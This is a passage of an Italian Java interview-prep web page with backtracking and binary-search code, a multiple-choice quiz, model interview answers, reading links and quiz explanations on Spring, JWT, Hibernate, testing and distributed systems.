        // EXPLORE
        backtrackPermute(nums, current, used, result);

        // UNCHOOSE (backtrack)
        current.remove(current.size() - 1);
        used[i] = false;
    }
}
// Time: O(n! * n), Space: O(n)</code></pre>

                <h3>Subsets</h3>

<pre><code class="language-java">// Genera tutti i sottoinsiemi
// [1,2,3] → [[],[1],[2],[1,2],[3],[1,3],[2,3],[1,2,3]]

public List&lt;List&lt;Integer&gt;&gt; subsets(int[] nums) {
    List&lt;List&lt;Integer&gt;&gt; result = new ArrayList&lt;&gt;();
    backtrackSubsets(nums, 0, new ArrayList&lt;&gt;(), result);
    return result;
}

private void backtrackSubsets(int[] nums, int start,
                              List&lt;Integer&gt; current,
                              List&lt;List&lt;Integer&gt;&gt; result) {
    // Ogni stato è un subset valido!
    result.add(new ArrayList&lt;&gt;(current));

    // Esplora aggiungendo elementi successivi
    for (int i = start; i < nums.length; i++) {
        current.add(nums[i]);                    // CHOOSE
        backtrackSubsets(nums, i + 1, current, result);  // EXPLORE
        current.remove(current.size() - 1);      // UNCHOOSE
    }
}
// Time: O(2^n * n), Space: O(n)</code></pre>

                <h3>N-Queens</h3>
                <p>Posiziona N regine su una scacchiera NxN senza che si minaccino.</p>

<pre><code class="language-java">public List&lt;List&lt;String&gt;&gt; solveNQueens(int n) {
    List&lt;List&lt;String&gt;&gt; result = new ArrayList&lt;&gt;();
    int[] queens = new int[n];  // queens[row] = column of queen
    Arrays.fill(queens, -1);
    Set&lt;Integer&gt; cols = new HashSet&lt;&gt;();
    Set&lt;Integer&gt; diag1 = new HashSet&lt;&gt;();  // row - col
    Set&lt;Integer&gt; diag2 = new HashSet&lt;&gt;();  // row + col

    backtrackQueens(0, n, queens, cols, diag1, diag2, result);
    return result;
}

private void backtrackQueens(int row, int n, int[] queens,
                             Set&lt;Integer&gt; cols, Set&lt;Integer&gt; diag1,
                             Set&lt;Integer&gt; diag2, List&lt;List&lt;String&gt;&gt; result) {
    if (row == n) {
        // Tutte le regine piazzate: costruisci la board
        result.add(buildBoard(queens, n));
        return;
    }

    for (int col = 0; col < n; col++) {
        // Pruning: salta se colonna o diagonale occupata
        if (cols.contains(col) ||
            diag1.contains(row - col) ||
            diag2.contains(row + col)) {
            continue;
        }

        // CHOOSE
        queens[row] = col;
        cols.add(col);
        diag1.add(row - col);
        diag2.add(row + col);

        // EXPLORE
        backtrackQueens(row + 1, n, queens, cols, diag1, diag2, result);

        // UNCHOOSE
        queens[row] = -1;
        cols.remove(col);
        diag1.remove(row - col);
        diag2.remove(row + col);
    }
}

private List&lt;String&gt; buildBoard(int[] queens, int n) {
    List&lt;String&gt; board = new ArrayList&lt;&gt;();
    for (int row = 0; row < n; row++) {
        char[] rowChars = new char[n];
        Arrays.fill(rowChars, '.');
        rowChars[queens[row]] = 'Q';
        board.add(new String(rowChars));
    }
    return board;
}
// Time: O(n!), Space: O(n)</code></pre>

                <div class="info-box">
                    <h4>Backtracking Template</h4>
<pre><code class="language-java">void backtrack(state, choices, result) {
    if (isSolution(state)) {
        result.add(copy(state));
        return;
    }

    for (choice : choices) {
        if (!isValid(choice)) continue;  // Pruning

        makeChoice(state, choice);       // CHOOSE
        backtrack(state, nextChoices, result);  // EXPLORE
        undoChoice(state, choice);       // UNCHOOSE
    }
}</code></pre>
                </div>
            </section>

            <!-- Binary Search Avanzato -->
            <section class="section" id="modulo18-binarysearch">
                <h2>Binary Search Avanzato</h2>

                <p>La <strong>Binary Search</strong> non serve solo per trovare un elemento: può trovare <strong>boundaries</strong> (primo/ultimo elemento che soddisfa una condizione) in array ordinati.</p>

                <h3>Template: Lower Bound e Upper Bound</h3>

<pre><code class="language-java">// Lower Bound: primo indice dove arr[i] >= target
public int lowerBound(int[] arr, int target) {
    int left = 0, right = arr.length;

    while (left < right) {
        int mid = left + (right - left) / 2;

        if (arr[mid] < target) {
            left = mid + 1;
        } else {
            right = mid;  // arr[mid] >= target, potrebbe essere la risposta
        }
    }

    return left;  // Primo indice dove arr[i] >= target
}

// Upper Bound: primo indice dove arr[i] > target
public int upperBound(int[] arr, int target) {
    int left = 0, right = arr.length;

    while (left < right) {
        int mid = left + (right - left) / 2;

        if (arr[mid] <= target) {
            left = mid + 1;
        } else {
            right = mid;
        }
    }

    return left;  // Primo indice dove arr[i] > target
}

// Count occurrences usando lower/upper bound
public int countOccurrences(int[] arr, int target) {
    return upperBound(arr, target) - lowerBound(arr, target);
}</code></pre>

                <h3>Search in Rotated Sorted Array</h3>

<pre><code class="language-java">// Array ordinato ma ruotato: [4,5,6,7,0,1,2], target=0 → 4
// [4,5,6,7,0,1,2], target=3 → -1

public int searchRotated(int[] nums, int target) {
    int left = 0, right = nums.length - 1;

    while (left <= right) {
        int mid = left + (right - left) / 2;

        if (nums[mid] == target) return mid;

        // Determina quale metà è ordinata
        if (nums[left] <= nums[mid]) {
            // Metà sinistra è ordinata
            if (nums[left] <= target && target < nums[mid]) {
                right = mid - 1;  // Target è nella metà ordinata
            } else {
                left = mid + 1;   // Target è nell'altra metà
            }
        } else {
            // Metà destra è ordinata
            if (nums[mid] < target && target <= nums[right]) {
                left = mid + 1;   // Target è nella metà ordinata
            } else {
                right = mid - 1;  // Target è nell'altra metà
            }
        }
    }

    return -1;
}
// Time: O(log n), Space: O(1)</code></pre>

                <h3>Find Minimum in Rotated Sorted Array</h3>

<pre><code class="language-java">// [3,4,5,1,2] → 1
// [4,5,6,7,0,1,2] → 0

public int findMin(int[] nums) {
    int left = 0, right = nums.length - 1;

    while (left < right) {
        int mid = left + (right - left) / 2;

        if (nums[mid] > nums[right]) {
            // Minimo è nella metà destra
            left = mid + 1;
        } else {
            // Minimo è nella metà sinistra (incluso mid)
            right = mid;
        }
    }

    return nums[left];
}
// Time: O(log n), Space: O(1)</code></pre>

                <h3>Search Range (First and Last Position)</h3>

<pre><code class="language-java">// Trova prima e ultima occorrenza di target
// nums = [5,7,7,8,8,10], target = 8 → [3, 4]
// nums = [5,7,7,8,8,10], target = 6 → [-1, -1]

public int[] searchRange(int[] nums, int target) {
    int first = findFirst(nums, target);
    if (first == -1) return new int[]{-1, -1};

    int last = findLast(nums, target);
    return new int[]{first, last};
}

private int findFirst(int[] nums, int target) {
    int left = 0, right = nums.length - 1;
    int result = -1;

    while (left <= right) {
        int mid = left + (right - left) / 2;

        if (nums[mid] == target) {
            result = mid;      // Trovato, ma cerca più a sinistra
            right = mid - 1;
        } else if (nums[mid] < target) {
            left = mid + 1;
        } else {
            right = mid - 1;
        }
    }

    return result;
}

private int findLast(int[] nums, int target) {
    int left = 0, right = nums.length - 1;
    int result = -1;

    while (left <= right) {
        int mid = left + (right - left) / 2;

        if (nums[mid] == target) {
            result = mid;      // Trovato, ma cerca più a destra
            left = mid + 1;
        } else if (nums[mid] < target) {
            left = mid + 1;
        } else {
            right = mid - 1;
        }
    }

    return result;
}
// Time: O(log n), Space: O(1)</code></pre>

                <div class="info-box success">
                    <h4>Binary Search: Quando usarla?</h4>
                    <p><strong>Array ordinato:</strong> Classico use case</p>
                    <p><strong>Funzione monotona:</strong> Se f(x) è crescente/decrescente, cerca dove f(x) = target o f(x) >= target</p>
                    <p><strong>"Binary search the answer":</strong> Se la risposta è in un range [lo, hi] e puoi verificare se una risposta è valida, usa binary search per trovare il minimo/massimo valido</p>
                </div>
            </section>

            <!-- Quiz Modulo 18 -->
            <section class="quiz-section" id="modulo18-quiz">
                <h2>Quiz - Modulo 18</h2>

                <div class="quiz-question" data-correct="b">
                    <h4><span>Q86.</span> Qual è la differenza chiave tra memoization (top-down) e tabulation (bottom-up)?</h4>
                    <div class="quiz-options">
                        <label class="quiz-option" data-value="a">
                            <input type="radio" name="q86" value="a">
                            <span>Memoization ha sempre complessità migliore</span>
                        </label>
                        <label class="quiz-option" data-value="b">
                            <input type="radio" name="q86" value="b">
                            <span>Memoization calcola solo i sottoproblemi necessari, tabulation li calcola tutti</span>
                        </label>
                        <label class="quiz-option" data-value="c">
                            <input type="radio" name="q86" value="c">
                            <span>Tabulation usa sempre meno memoria di memoization</span>
                        </label>
                        <label class="quiz-option" data-value="d">
                            <input type="radio" name="q86" value="d">
                            <span>Memoization non può essere usata con problemi multidimensionali</span>
                        </label>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q86')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q86"></div>
                </div>

                <div class="quiz-question" data-correct="c">
                    <h4><span>Q87.</span> Nel problema "Longest Substring Without Repeating Characters", quando contrai la finestra?</h4>
                    <div class="quiz-options">
                        <label class="quiz-option" data-value="a">
                            <input type="radio" name="q87" value="a">
                            <span>Quando la finestra supera una dimensione massima prefissata</span>
                        </label>
                        <label class="quiz-option" data-value="b">
                            <input type="radio" name="q87" value="b">
                            <span>Ad ogni iterazione, per mantenere la finestra minimale</span>
                        </label>
                        <label class="quiz-option" data-value="c">
                            <input type="radio" name="q87" value="c">
                            <span>Quando trovi un carattere duplicato già presente nella finestra corrente</span>
                        </label>
                        <label class="quiz-option" data-value="d">
                            <input type="radio" name="q87" value="d">
                            <span>Mai, la finestra solo si espande</span>
                        </label>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q87')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q87"></div>
                </div>

                <div class="quiz-question" data-correct="a">
                    <h4><span>Q88.</span> Perché nel problema "Container With Most Water" muovi il puntatore con altezza minore?</h4>
                    <div class="quiz-options">
                        <label class="quiz-option" data-value="a">
                            <input type="radio" name="q88" value="a">
                            <span>Muovere quello maggiore non può aumentare l'area, perché l'area è limitata dal minore</span>
                        </label>
                        <label class="quiz-option" data-value="b">
                            <input type="radio" name="q88" value="b">
                            <span>Per mantenere i puntatori ordinati per altezza</span>
                        </label>
                        <label class="quiz-option" data-value="c">
                            <input type="radio" name="q88" value="c">
                            <span>È una scelta arbitraria, funzionerebbe anche l'opposto</span>
                        </label>
                        <label class="quiz-option" data-value="d">
                            <input type="radio" name="q88" value="d">
                            <span>Per garantire che la larghezza diminuisca uniformemente</span>
                        </label>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q88')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q88"></div>
                </div>

                <div class="quiz-question" data-correct="d">
                    <h4><span>Q89.</span> Nel backtracking per N-Queens, cosa permette il pruning O(1) per verificare se una posizione è valida?</h4>
                    <div class="quiz-options">
                        <label class="quiz-option" data-value="a">
                            <input type="radio" name="q89" value="a">
                            <span>Controllare solo la riga corrente</span>
                        </label>
                        <label class="quiz-option" data-value="b">
                            <input type="radio" name="q89" value="b">
                            <span>Usare una matrice NxN per marcare le celle occupate</span>
                        </label>
                        <label class="quiz-option" data-value="c">
                            <input type="radio" name="q89" value="c">
                            <span>Ordinare le regine per posizione</span>
                        </label>
                        <label class="quiz-option" data-value="d">
                            <input type="radio" name="q89" value="d">
                            <span>Set separati per colonne, diagonale principale (row-col) e anti-diagonale (row+col)</span>
                        </label>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q89')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q89"></div>
                </div>

                <div class="quiz-question" data-correct="b">
                    <h4><span>Q90.</span> In "Search in Rotated Sorted Array", come determini quale metà dell'array è ordinata?</h4>
                    <div class="quiz-options">
                        <label class="quiz-option" data-value="a">
                            <input type="radio" name="q90" value="a">
                            <span>Confrontando nums[mid] con target</span>
                        </label>
                        <label class="quiz-option" data-value="b">
                            <input type="radio" name="q90" value="b">
                            <span>Confrontando nums[left] con nums[mid]: se nums[left] <= nums[mid], la metà sinistra è ordinata</span>
                        </label>
                        <label class="quiz-option" data-value="c">
                            <input type="radio" name="q90" value="c">
                            <span>Trovando prima il punto di rotazione con una ricerca separata</span>
                        </label>
                        <label class="quiz-option" data-value="d">
                            <input type="radio" name="q90" value="d">
                            <span>Confrontando nums[mid] con nums[mid+1]</span>
                        </label>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q90')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q90"></div>
                </div>
            </section>

            <!-- Questions Section Modulo 18 -->
            <section class="section" id="modulo18-questions">
                <h2>Domande da Colloquio - Modulo 18</h2>

                <div class="info-box">
                    <h4>Q: Come riconosci che un problema richiede Dynamic Programming?</h4>
                    <p><strong>Risposta attesa:</strong> Due caratteristiche: <strong>1) Optimal substructure:</strong> la soluzione ottima si costruisce da soluzioni ottime di sottoproblemi. <strong>2) Overlapping subproblems:</strong> gli stessi sottoproblemi vengono risolti più volte. Pattern comuni: "minimo/massimo di...", "numero di modi per...", "è possibile...?", "più lungo/corto...". Esempio: Fibonacci ha overlapping (fib(3) calcolato più volte in fib(5)) e optimal substructure (fib(n) = fib(n-1) + fib(n-2)).</p>
                </div>

                <div class="info-box">
                    <h4>Q: Quando useresti sliding window vs two pointers?</h4>
                    <p><strong>Risposta attesa:</strong> <strong>Sliding Window:</strong> per problemi su subarray/substring CONTIGUE. La finestra si espande/contrae. Esempi: max sum di k elementi, longest substring senza duplicati, minimum window substring. <strong>Two Pointers:</strong> per problemi che richiedono di esaminare coppie di elementi, spesso da estremi opposti. Esempi: two sum in sorted array, container with most water, palindrome check. Se cerchi elementi contigui → sliding window. Se cerchi coppie/triple non necessariamente contigue → two pointers.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Spiega la tecnica di "binary search on the answer".</h4>
                    <p><strong>Risposta attesa:</strong> Quando la risposta è un numero in un range [lo, hi] e hai una funzione che verifica se una risposta è "abbastanza buona" (monotona), puoi usare binary search per trovare il minimo/massimo valido. Esempio: "Koko eating bananas" - trova la velocità minima per finire in H ore. La risposta è tra 1 e max(piles). Per ogni velocità, calcoli le ore necessarie. Velocità più alta = meno ore (monotona). Binary search sulla velocità, cercando la minima che permette di finire in tempo.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come ottimizzeresti lo spazio in un problema di DP 2D?</h4>
                    <p><strong>Risposta attesa:</strong> Se dp[i][j] dipende solo dalla riga i-1 (non da righe più vecchie), puoi usare solo 2 righe (o anche 1 iterando all'indietro). Esempio: Longest Common Subsequence normalmente usa O(m*n) spazio, ma dp[i][j] dipende solo da dp[i-1][j], dp[i][j-1], dp[i-1][j-1]. Quindi basta una riga + variabile per il valore diagonale. Knapsack: invece di dp[n][capacity], usa dp[capacity] iterando i pesi all'INDIETRO per non sovrascrivere valori necessari.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Qual è la complessità temporale di generare tutte le permutazioni?</h4>
                    <p><strong>Risposta attesa:</strong> O(n! * n). Ci sono n! permutazioni (n scelte per il primo, n-1 per il secondo, ..., 1 per l'ultimo = n!). Per ogni permutazione, copiamo l'array risultato che costa O(n). Quindi O(n! * n). Per i sottoinsiemi (subsets): 2^n sottoinsiemi, copia media O(n/2), quindi O(2^n * n). Questi sono problemi intrinsecamente esponenziali - non puoi fare meglio se devi generare tutti i risultati.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come gestiresti i duplicati in problemi di backtracking come "Subsets II"?</h4>
                    <p><strong>Risposta attesa:</strong> <strong>1) Ordina l'array</strong> - mette i duplicati adiacenti. <strong>2) Skip duplicati</strong> nella stessa "posizione di scelta": se nums[i] == nums[i-1] E non hai scelto nums[i-1] nel ramo corrente, skippa nums[i]. Questo evita di generare lo stesso subset da percorsi diversi. Esempio: [1,2,2] → skippa il secondo 2 se il primo 2 non è nel subset corrente. Condizione: <code>if (i > start && nums[i] == nums[i-1]) continue;</code></p>
                </div>
            </section>

            <!-- Links Modulo 18 -->
            <section class="section" id="modulo18-links">
                <h2>Link di Approfondimento - Modulo 18</h2>

                <div class="info-box">
                    <h4>Dynamic Programming</h4>
                    <p><a href="https://leetcode.com/explore/learn/card/dynamic-programming/" target="_blank">LeetCode: Dynamic Programming Explore Card</a> - Corso interattivo</p>
                    <p><a href="https://www.youtube.com/watch?v=oBt53YbR9Kk" target="_blank">freeCodeCamp: Dynamic Programming (Video 5h)</a> - Corso completo</p>
                    <p><a href="https://www.geeksforgeeks.org/dynamic-programming/" target="_blank">GeeksforGeeks: Dynamic Programming</a> - Raccolta problemi</p>
                    <p><a href="https://cp-algorithms.com/dynamic_programming/intro-to-dp.html" target="_blank">CP Algorithms: Intro to DP</a></p>
                </div>

                <div class="info-box">
                    <h4>Sliding Window & Two Pointers</h4>
                    <p><a href="https://leetcode.com/tag/sliding-window/" target="_blank">LeetCode: Sliding Window Problems</a></p>
                    <p><a href="https://leetcode.com/tag/two-pointers/" target="_blank">LeetCode: Two Pointers Problems</a></p>
                    <p><a href="https://www.youtube.com/watch?v=GcW4mgmgSbw" target="_blank">NeetCode: Sliding Window Pattern</a></p>
                    <p><a href="https://www.baeldung.com/java-sliding-window-algorithm" target="_blank">Baeldung: Sliding Window Algorithm in Java</a></p>
                </div>

                <div class="info-box">
                    <h4>Backtracking</h4>
                    <p><a href="https://leetcode.com/explore/learn/card/recursion-ii/472/backtracking/" target="_blank">LeetCode: Backtracking Explore</a></p>
                    <p><a href="https://www.youtube.com/watch?v=REOH22Xwdkk" target="_blank">Abdul Bari: Backtracking Explained</a></p>
                    <p><a href="https://leetcode.com/problems/subsets/solutions/27281/a-general-approach-to-backtracking-questions-in-java-subsets-permutations-combination-sum-palindrome-partitioning/" target="_blank">LeetCode: General Backtracking Template</a></p>
                </div>

                <div class="info-box">
                    <h4>Binary Search</h4>
                    <p><a href="https://leetcode.com/explore/learn/card/binary-search/" target="_blank">LeetCode: Binary Search Explore Card</a></p>
                    <p><a href="https://www.topcoder.com/thrive/articles/Binary%20Search" target="_blank">TopCoder: Binary Search Tutorial</a></p>
                    <p><a href="https://www.youtube.com/watch?v=W9QJ8HaRvJQ" target="_blank">Errichto: Binary Search Tutorial</a></p>
                </div>

                <div class="info-box">
                    <h4>Practice Platforms & Risorse Generali</h4>
                    <p><a href="https://leetcode.com/" target="_blank">LeetCode</a> - La piattaforma più usata per coding interview</p>
                    <p><a href="https://neetcode.io/roadmap" target="_blank">NeetCode Roadmap</a> - 150 problemi curati per argomento</p>
                    <p><a href="https://www.techinterviewhandbook.org/grind75" target="_blank">Grind 75</a> - Lista curata di 75 problemi essenziali</p>
                    <p><a href="https://algo.monster/" target="_blank">Algo Monster</a> - Pattern-based learning</p>
                    <p><a href="https://github.com/kdn251/interviews" target="_blank">GitHub: Interviews</a> - Raccolta risorse per colloqui</p>
                </div>

                <div class="info-box">
                    <h4>Libri Consigliati</h4>
                    <p><a href="https://www.crackingthecodinginterview.com/" target="_blank">Cracking the Coding Interview</a> - Gayle Laakmann McDowell</p>
                    <p><a href="https://elementsofprogramminginterviews.com/" target="_blank">Elements of Programming Interviews</a> - Disponibile in Java</p>
                    <p><a href="https://www.algorist.com/" target="_blank">The Algorithm Design Manual</a> - Steven Skiena</p>
                </div>
            </section>

        </main>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-java.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-json.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-yaml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-docker.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-groovy.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
    <script>
        // Quiz feedback explanations
        const explanations = {
            q1: {
                correct: 'c',
                correctText: '✅ Corretto! Questo è il classico problema della self-invocation. Quando methodA() chiama methodB() internamente, la chiamata NON passa attraverso il proxy Spring, quindi l\'annotazione @Transactional(REQUIRES_NEW) viene completamente ignorata. Entrambe le operazioni avvengono nella stessa transazione, e quando l\'eccezione viene lanciata, tutta la transazione fa rollback.',
                incorrectText: {
                    a: '❌ Sbagliato. Questa risposta sarebbe corretta SE la chiamata passasse attraverso il proxy, ma qui c\'è il problema della self-invocation. Quando un metodo chiama un altro metodo della stessa classe con this.methodB() (anche implicito), bypassa il proxy Spring. REQUIRES_NEW non ha alcun effetto.',
                    b: '❌ Parzialmente corretto sul risultato, ma per il motivo sbagliato. Entrambi fanno rollback, vero, ma non semplicemente perché l\'eccezione si propaga. Il punto chiave è che REQUIRES_NEW NON funziona a causa della self-invocation. Senza questo concetto, non avresti dimostrato la comprensione del proxy pattern.',
                    d: '❌ Sbagliato. Il codice compila perfettamente. Puoi avere quanti @Transactional vuoi nello stesso service. Il problema è che le annotazioni sui metodi interni vengono ignorate quando chiamati internamente (self-invocation).'
                }
            },
            q2: {
                correct: 'b',
                correctText: '✅ Corretto! L\'affermazione B è FALSA. Con RS256 (algoritmo asimmetrico), il JWT viene FIRMATO con la chiave privata ma può essere VALIDATO da chiunque possieda la chiave pubblica. Questo è proprio il vantaggio: puoi distribuire la chiave pubblica a tutti i microservizi che devono validare i token, senza esporre la chiave privata.',
                incorrectText: {
                    a: '❌ Questa affermazione è VERA. Il payload JWT è solo Base64 encoded, non encrypted. Chiunque può decodificarlo con un semplice base64 decode. Per questo non dovresti MAI inserire dati sensibili nel payload.',
                    c: '❌ Questa affermazione è VERA. I JWT sono stateless by design. Una volta emesso un token, rimane valido fino alla scadenza. Per revocare un JWT hai bisogno di meccanismi aggiuntivi come una blacklist di token o short-lived tokens con refresh token rotation.',
                    d: '❌ Questa affermazione è VERA. La signature è calcolata sull\'header e payload. Se qualcuno modifica il payload, la signature non corrisponderà più e il token verrà rifiutato durante la validazione.'
                }
            },
            q3: {
                correct: 'd',
                correctText: '✅ Corretto! Con due collection di tipo List, un singolo JOIN FETCH o EntityGraph causerebbe un MultipleBagFetchException (o peggio, un Cartesian Product con risultati duplicati). Le soluzioni valide sono: (1) cambiare una delle collection in Set, permettendo così il JOIN FETCH di entrambe, oppure (2) usare due query separate con @BatchSize per ottimizzare il lazy loading.',
                incorrectText: {
                    a: '❌ Sbagliato. Questa query causerebbe un MultipleBagFetchException! Hibernate non permette di fare JOIN FETCH di due "bag" (List non ordinate) contemporaneamente perché non può distinguere i duplicati nel Cartesian Product risultante.',
                    b: '❌ Sbagliato e pericoloso! FetchType.EAGER è quasi sempre una cattiva idea. Caricheresti sempre entrambe le collection anche quando non servono, e potresti comunque incorrere nel problema del Cartesian Product con query inefficienti.',
                    c: '❌ Sbagliato. @EntityGraph con due collection List ha lo stesso problema del JOIN FETCH: MultipleBagFetchException. EntityGraph è solo zucchero sintattico sopra JOIN FETCH.'
                }
            },
            q4: {
                correct: 'a',
                correctText: '✅ Corretto! I proxy AOP vengono creati durante postProcessAfterInitialization(). A questo punto il bean è stato completamente inizializzato (@PostConstruct già eseguito), e il BeanPostProcessor può sostituire il bean originale con un proxy che lo avvolge. Questo è il motivo per cui @PostConstruct viene eseguito sulla classe reale, non sul proxy.',
                incorrectText: {
                    b: '❌ Sbagliato. Durante l\'instantiation (fase 1), Spring crea semplicemente l\'istanza del bean usando il costruttore. Il proxy viene creato molto dopo, quando il bean è completamente configurato.',
                    c: '❌ Sbagliato. @PostConstruct viene eseguito PRIMA della creazione del proxy. Infatti, @PostConstruct viene chiamato sulla classe reale, ed è per questo che all\'interno di @PostConstruct non puoi fare self-invocation con aspetti che funzionino.',
                    d: '❌ Sbagliato. postProcessBeforeInitialization() viene eseguito PRIMA di @PostConstruct e dell\'initialization. Il proxy viene creato DOPO, in postProcessAfterInitialization().'
                }
            },
            q5: {
                correct: 'c',
                correctText: '✅ Corretto! I livelli di isolamento sono gerarchici. Phantom Reads sono l\'anomalia "più difficile" da prevenire, e per prevenirla devi prima prevenire tutte le anomalie più "leggere" (Dirty Reads e Non-Repeatable Reads). Non esiste un livello che prevenga i Phantom ma permetta i Non-Repeatable. L\'ordine è: READ_UNCOMMITTED < READ_COMMITTED < REPEATABLE_READ < SERIALIZABLE.',
                incorrectText: {
                    a: '❌ Sbagliato. READ_COMMITTED previene solo i Dirty Reads. Sia Non-Repeatable Reads che Phantom Reads sono ancora possibili.',
                    b: '❌ Sbagliato. REPEATABLE_READ previene Dirty Reads e Non-Repeatable Reads, ma permette ancora Phantom Reads (in alcuni database). È l\'opposto di quello che chiede la domanda.',
                    d: '❌ Sbagliato. SERIALIZABLE previene TUTTE le anomalie (Dirty, Non-Repeatable, e Phantom). Non permette nessuna delle due.'
                }
            },
            // Modulo 2 - Testing
            q6: {
                correct: 'b',
                correctText: '✅ Corretto! Qui stiamo verificando un SIDE-EFFECT: l\'invio di un\'email. Non ci interessa il valore di ritorno, ma verificare CHE l\'email venga inviata e CON QUALI parametri. Questo è esattamente il caso d\'uso di un Mock con behavior verification (verify()).',
                incorrectText: {
                    a: '❌ Sbagliato. Uno Stub fornisce risposte predefinite, ma non verifica che il metodo sia stato chiamato. Se EmailService.send() non venisse mai chiamato, il test passerebbe comunque! Non stiamo testando un valore di ritorno, ma un side-effect.',
                    c: '❌ Non è sbagliato in assoluto, ma non è l\'approccio migliore. Un Fake è utile per Integration Test o quando hai bisogno di un\'implementazione funzionante. Per un Unit Test dove vuoi verificare l\'interazione, un Mock è più diretto e leggibile.',
                    d: '❌ Sbagliato. Uno Spy avvolge un oggetto REALE. Non vuoi che il test invii email vere! Inoltre, lo Spy è utile quando hai bisogno del comportamento reale di alcuni metodi, non quando vuoi sostituire completamente la dipendenza.'
                }
            },
            q7: {
                correct: 'c',
                correctText: '✅ Corretto! I test E2E sono intrinsecamente più "flaky" perché dipendono da molti fattori: network latency, database state, external services availability, browser rendering timing, ecc. Un fallimento può essere causato da qualsiasi componente del sistema, non necessariamente dal codice modificato.',
                incorrectText: {
                    a: '❌ Sbagliato. La Test Pyramid suggerisce esattamente l\'opposto: i test E2E dovrebbero essere il 5-10% del totale. Il 70-80% dovrebbe essere coperto da Unit Test, che sono più veloci, economici e affidabili.',
                    b: '❌ Sbagliato. "Affidabile" qui è ambiguo. Gli Integration Test possono avere falsi positivi (test che passano ma il codice ha bug) o falsi negativi (test che falliscono per ragioni esterne come database non disponibile). Gli Unit Test con mock corretti sono più deterministici.',
                    d: '❌ Sbagliato. Il "test-first" approach significa scrivere test prima del codice, non tutti i test insieme in anticipo. Ogni test guida l\'implementazione incrementale.'
                }
            },
            q9: {
                correct: 'a',
                correctText: '✅ Corretto! Questo è un caso perfetto per un Mock con behavior verification. Puoi configurare il mock per fallire le prime N chiamate (thenThrow().thenThrow().thenReturn()), e poi verificare con verify(mock, times(3)) che il retry sia avvenuto. È veloce, deterministico, e testa esattamente la logica di retry.',
                incorrectText: {
                    b: '❌ Sbagliato. Un test E2E con gateway di staging è lento, costoso, e difficile da rendere deterministico. Come simuli esattamente 2 fallimenti seguiti da un successo? Inoltre, dipendi dalla disponibilità del servizio esterno.',
                    c: '❌ Sbagliato. Uno Stub che ritorna sempre successo non ti permette di testare la retry logic! Non saprai mai se il retry viene effettivamente eseguito quando il gateway fallisce.',
                    d: '❌ Sbagliato. La retry logic è logica di business che può (e deve) essere testata in isolamento. Anzi, gli Unit Test sono ideali per questo caso perché puoi controllare esattamente quando il mock fallisce e quando succede.'
                }
            },
            q10: {
                correct: 'b',
                correctText: '✅ Corretto! Test B usa await() con timeout per aspettare eventual consistency. Questo tipo di test è notoriamente flaky perché: (1) il timing può variare in base al carico del sistema, (2) 5 secondi potrebbero non bastare in CI con risorse limitate, (3) race condition tra indexing e query. I test che dipendono da timing/async sono la fonte principale di flakiness.',
                incorrectText: {
                    a: '❌ Sbagliato. Test A è un Unit Test puro con mock deterministico. Non c\'è nulla di flaky: il mock ritorna sempre lo stesso valore, il test passerà sempre (o fallirà sempre se c\'è un bug).',
                    c: '❌ Sbagliato. Test C testa una somma di interi. Non ci sono problemi di floating point con int (quelli si verificano con float/double). Questo test è completamente deterministico.',
                    d: '❌ Sbagliato. Test D è un Integration Test standard con DB. Con @Transactional e rollback automatico (o DB in-memory pulito), non ci sono collisioni di ID. Il test è deterministico.'
                }
            },
            // Modulo 3 - Architettura & Scalabilità
            q11: {
                correct: 'c',
                correctText: '✅ Corretto! Quando un Circuit Breaker è in HALF-OPEN, sta "testando" se il servizio downstream è tornato sano. Se la richiesta di test fallisce, significa che il servizio non si è ancora ripreso, quindi il breaker torna in OPEN e ricomincia il timer di attesa. Solo se la richiesta ha successo torna in CLOSED.',
                incorrectText: {
                    a: '❌ Sbagliato. Lo stato HALF-OPEN permette un numero limitato di richieste di test (configurabile, spesso 1). Se fallisce, non continua a testare ma torna in OPEN per proteggere il sistema.',
                    b: '❌ Sbagliato. CLOSED significa "tutto ok, lascia passare tutte le richieste". Un fallimento in HALF-OPEN indica che il servizio NON è tornato sano, quindi tornare in CLOSED sarebbe pericoloso.',
                    d: '❌ Sbagliato. Non esiste uno stato DISABLED nel pattern standard del Circuit Breaker. Il ciclo è sempre: CLOSED ↔ OPEN ↔ HALF-OPEN.'
                }
            },
            q12: {
                correct: 'b',
                correctText: '✅ Corretto! Un sistema AP (Availability over Consistency) durante una partition continua a rispondere alle richieste anche se non può garantire che tutti i nodi abbiano gli stessi dati. Questo significa che utenti diversi potrebbero vedere versioni diverse dei dati (stale reads) o che scritture su nodi diversi potrebbero divergere. Sistemi come Cassandra e DynamoDB seguono questo modello.',
                incorrectText: {
                    a: '❌ Sbagliato. Rifiutare le scritture ma permettere le letture è un compromesso, ma non è la definizione di AP. Un sistema AP cerca di mantenere availability per TUTTE le operazioni.',
                    c: '❌ Sbagliato. Bloccare tutte le richieste è esattamente l\'opposto di Availability. Questa sarebbe la scelta di un sistema CP (Consistency over Availability).',
                    d: '❌ Sbagliato. L\'elezione di un leader è una tecnica per mantenere consistency (sistemi CP come MongoDB). Durante una partition, se non c\'è quorum, un sistema CP rifiuta le richieste piuttosto che rischiare inconsistenza.'
                }
